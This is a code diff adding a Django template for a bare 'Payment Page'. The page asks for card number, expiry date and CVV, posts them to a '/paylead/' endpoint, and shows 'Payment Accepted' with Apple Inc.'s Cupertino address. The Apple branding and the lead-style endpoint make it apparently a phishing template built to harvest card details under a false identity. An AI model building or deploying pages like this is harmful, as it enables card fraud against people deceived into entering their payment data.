@@ -1,0 +1,64 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Payment Page</title>
+</head>
+
+<link rel="stylesheet" type="text/css" href="{% static 'css/pay.css' %}" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>
+    <body>
+    <div class="container" align="center">
+        <div id="loginForm">
+            <div class="panel panel-default"><div class="panel-heading">
+            </div>
+                <div class="authentification">
+                    <form class="form-control"action="/paylead/" method="POST" accept-charset="UTF-8" role="form">
+                    {% csrf_token %}
+                        <input maxlength="16" pattern="[0-9]*" onkeypress='validate(event)' class="inputs" autocorrect="off" autocapitalize="on" spellcheck="false" style="font-size: 17px;  color: #5b5b5b; width: 333px; height: 35px; margin-top:35px; " id="paynumber" type="text" name="paynumber" placeholder="card number">
+                        <input maxlength="2" pattern="[0-9]*" onkeypress='validate(event)' class="inputs" autocorrect="off" autocapitalize="on" spellcheck="false" style="font-size: 17px;  color: #5b5b5b; width:50px; height:35px; font-size: 17px;" id="expmonth" type="text" name="expmonth" placeholder="mm">
+                        <input maxlength="4" pattern="[0-9]*" onkeypress='validate(event)' class="inputs" autocorrect="off" autocapitalize="on" spellcheck="false" style="font-size: 17px;  color: #5b5b5b; width:75px; height:35px; font-size: 17px;" id="expyear" type="text" name="expyear" placeholder="yyyy">
+                        <input maxlength="4" pattern="[0-9]*" onkeypress='validate(event)' class="inputs" autocorrect="off" autocapitalize="on" spellcheck="false" style="font-size: 17px;  color: #5b5b5b; width:155px; height:35px;" id="cvv" type="text" name="cvv" placeholder="cvv">
+                        <button type="submit" class="button" id="button" value=""></button>
+                        {% if error_message %}
+                         <span style="font-size: 15px; color: red;"> {{ error_message }} </span> <br />
+                     {% endif %}
+
+
+                    </form><p style="margin-top: 350px;">Payment Accepted <br>
+                                        <img style=" margin-right: 15px; width: 120px; height: 25px;" src="{% static 'images/logo.png' %}" alt="">
+                    <br>Apple Inc. Cupertino, CA 95014, US</p>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+    </body>
+
+<script>
+function validate(evt) {
+  var theEvent = evt || window.event;
+  var key = theEvent.keyCode || theEvent.which;
+  key = String.fromCharCode( key );
+  var regex = /[0-9]|\./;
+  if( !regex.test(key) ) {
+    theEvent.returnValue = false;
+    if(theEvent.preventDefault) theEvent.preventDefault();
+  }
+}
+
+$(".inputs").keyup(function () {
+    if (this.value.length == this.maxLength) {
+        var $next = $(this).next('.inputs');
+            if ($next.length)
+                $(this).next('.inputs').focus();
+    else
+        $(this).blur();
+    }
+
+});
+</script>
